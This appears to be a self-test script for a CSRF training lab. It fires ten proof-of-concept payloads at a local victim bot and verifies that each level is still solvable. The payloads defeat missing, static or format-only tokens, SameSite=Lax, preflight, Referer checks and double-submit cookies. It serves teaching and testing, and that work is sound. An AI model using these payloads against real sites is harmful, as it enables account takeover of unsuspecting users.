<?php
/**
 * CSRF Lab self-test: delivers the intended PoC for every level to the victim
 * bot (visit.php) and confirms the admin's state actually changed and the flag
 * was awarded, so a level that has quietly stopped being solvable is caught.
 *
 *   docker compose exec -T web php /var/www/html/solve_check.php
 *
 * Each level is asserted three ways, not just "the flag string is on the page":
 *   1. the delivery reported "Exploit landed." (the level's real handler ran),
 *   2. the Victim Admin Console now shows the attacker's value (state changed),
 *   3. the flag block rendered, with the flag from the lab's own flag function.
 *
 * The run uses a brand-new PHP session, so no level can look solved because a
 * previous run solved it.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;
$jar  = '';   // PHPSESSID for the learner session driving the lab

function http_req(string $url, ?array $post = null): string
{
    global $jar;
    $headers = "Accept: text/html\r\n";
    if ($jar !== '') {
        $headers .= "Cookie: $jar\r\n";
    }
    $opts = ['method' => 'GET', 'timeout' => 30, 'ignore_errors' => true, 'follow_location' => 0];
    if ($post !== null) {
        $opts['method']  = 'POST';
        $opts['content'] = http_build_query($post);
        $headers .= "Content-Type: application/x-www-form-urlencoded\r\n";
    }
    $opts['header'] = $headers;
    $body = (string)@file_get_contents($url, false, stream_context_create(['http' => $opts]));

    foreach (($http_response_header ?? []) as $h) {
        if (stripos($h, 'Set-Cookie:') === 0 && preg_match('/PHPSESSID=[^;]+/', $h, $m)) {
            $jar = $m[0];
        }
    }
    return $body;
}

/** Deliver a PoC as the attacker, then read the level page the victim's action produced. */
function deliver(int $level, string $poc): string
{
    http_req("http://localhost/visit.php", ['level' => $level, 'poc' => $poc]);
    return http_req("http://localhost/level$level.php");
}

/** Read one "Victim Admin Console" row value out of the rendered level page. */
function console_value(string $body, string $label): string
{
    $pat = '~<th[^>]*>' . preg_quote(htmlspecialchars($label), '~') . '</th>\s*<td>(.*?)</td>~s';
    return preg_match($pat, $body, $m) ? html_entity_decode(trim($m[1]), ENT_QUOTES) : '';
}

function check(int $level, string $body, string $stateLabel, string $wantState, string $note): void
{
    global $pass, $fail;
    $flag    = get_flag_for_level($level);
    $landed  = strpos($body, 'Exploit landed.') !== false;
    $awarded = strpos($body, 'Flag Captured!') !== false && strpos($body, $flag) !== false;
    $got     = console_value($body, $stateLabel);
    $changed = ($got === $wantState);

    if ($landed && $awarded && $changed) {
        $pass++;
        printf("  PASS  level %-2d %s  (%s; %s -> %s)\n", $level, $flag, $note, $stateLabel, $got);
    } else {
        $fail++;
        $why = [];
        if (!$landed)  $why[] = 'exploit did not land';
        if (!$changed) $why[] = "victim state '$stateLabel' is '$got', expected '$wantState'";
        if (!$awarded) $why[] = 'flag not awarded';
        printf("  FAIL  level %-2d expected %s  (%s)\n", $level, $flag, implode('; ', $why));
    }
}

$mail = CSRF_ATTACKER_EMAIL;   // attacker@evil.com
$user = CSRF_TARGET_USER;      // mallory
$tok  = '0123456789abcdef0123456789abcdef';   // any well-formed, non-session-bound token

/** Auto-submitting cross-site POST form — the workhorse PoC for levels 2-5, 8, 9. */
function poc_form(string $action, array $fields, string $prefix = '', string $suffix = ''): string
{
    $inputs = '';
    foreach ($fields as $n => $v) {
        $inputs .= "  <input type=\"hidden\" name=\"$n\" value=\"$v\">\n";
    }
    return $prefix
        . "<form action=\"$action\" method=\"POST\" id=\"f\">\n$inputs</form>\n"
        . "<script>\n$suffix  document.getElementById('f').submit();\n</script>\n";
}

echo "CSRF Lab self-test\n------------------\n";

// Fresh learner session: every level starts unsolved.
http_req("$base/index.php");

/* 1 - GET state change, no token: an <img> fires it on page load */
check(1, deliver(1, "<img src=\"change_email.php?email=$mail\">"),
    'Admin account email', $mail, 'img tag forces the authenticated GET');

/* 2 - POST but still no token: a cross-site auto-submitting form */
check(2, deliver(2, poc_form('change_email.php', ['email' => $mail])),
    'Admin account email', $mail, 'auto-submitting cross-site POST');

/* 3 - the csrf_token field exists but is never compared, so any value passes */
check(3, deliver(3, poc_form('change_email.php', ['email' => $mail, 'csrf_token' => 'anything'])),
    'Admin account email', $mail, 'token read but never validated');

/* 4 - the expected token is a hardcoded constant printed in the source */
check(4, deliver(4, poc_form('promote.php', ['user' => $user, 'csrf_token' => CSRF_STATIC_TOKEN])),
    "User '$user' role", 'admin', 'static token reused');

/* 5 - the token is checked for FORMAT only, never against the session */
check(5, deliver(5, poc_form('change_email.php', ['email' => $mail, 'csrf_token' => $tok])),
    'Admin account email', $mail, 'self-minted 32-hex token');

/* 6 - SameSite=Lax still attaches the cookie to a top-level GET navigation */
check(6, deliver(6, "<script>window.location = \"quick_email.php?email=$mail\";</script>"),
    'Admin account email', $mail, 'top-level nav beats SameSite=Lax');

/* 7 - text/plain is a simple request, so JSON reaches the API with no preflight */
$poc7 = "<script>\n"
      . "fetch(\"api_update.php\", {\n"
      . "  method: \"POST\",\n"
      . "  headers: { \"Content-Type\": \"text/plain\" },\n"
      . "  body: '{\"email\":\"$mail\"}',\n"
      . "  credentials: \"include\"\n"
      . "});\n</script>\n";
check(7, deliver(7, $poc7),
    'Admin account email', $mail, 'text/plain smuggles JSON past preflight');

/* 8 - the Referer check fails open, so suppress the header entirely */
check(8, deliver(8, poc_form('change_email.php', ['email' => $mail],
        "<meta name=\"referrer\" content=\"no-referrer\">\n")),
    'Admin account email', $mail, 'no-referrer makes the check fail open');

/* 9 - double submit: the attacker sets the cookie AND the body to one value */
check(9, deliver(9, poc_form('promote.php', ['user' => $user, 'csrf_token' => 'pwned123'], '',
        "  document.cookie = \"csrf_token=pwned123; path=/\";\n")),
    "User '$user' role", 'admin', 'attacker-set cookie matches the body token');

/* 10 - one GET that defeats the token, SameSite=Lax and the Referer check at once */
$poc10 = "<meta name=\"referrer\" content=\"no-referrer\">\n"
       . "<meta http-equiv=\"refresh\" content=\"0;url=transfer_owner.php?new_owner=$user&csrf_token=$tok\">\n";
check(10, deliver(10, $poc10),
    'Account owner', $user, 'top-level GET + no-referrer + format-only token');

echo "------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
